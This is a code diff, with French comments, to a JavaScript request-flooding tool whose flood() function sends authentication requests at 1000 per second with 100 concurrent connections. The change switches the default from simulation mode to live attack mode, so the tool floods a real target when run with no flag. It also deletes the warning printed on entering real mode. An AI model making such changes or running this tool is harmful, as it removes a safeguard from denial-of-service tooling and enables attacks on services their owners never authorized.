@@ -18,7 +18,7 @@ const CONFIG = {
     requestsPerSecond: 1000,
     duration: 10,  // secondes
     concurrent: 100,
-    simulate: true  // Mode simulation par défaut
+    simulate: false  // Mode reel par defaut
 };
 
 // Statistiques
@@ -225,12 +225,16 @@ async function flood() {
     console.log('═'.repeat(60) + '\n');
 }
 
-// Exécution
-if (process.argv.includes('--real')) {
+// Execution
+if (process.argv.includes('--simulate')) {
+    CONFIG.simulate = true;
+    console.log('Mode simulation active. Utilisez --real (ou aucun flag) pour attaquer en mode reel.');
+} else if (process.argv.includes('--real')) {
     CONFIG.simulate = false;
-    console.log('⚠️  MODE RÉEL ACTIVÉ - Assurez-vous d\'avoir la cible configurée');
+    console.log('Mode reel active.');
 }
 
 flood().catch(console.error);
 
 module.exports = { generateAuthRequest, flood, stats };
+
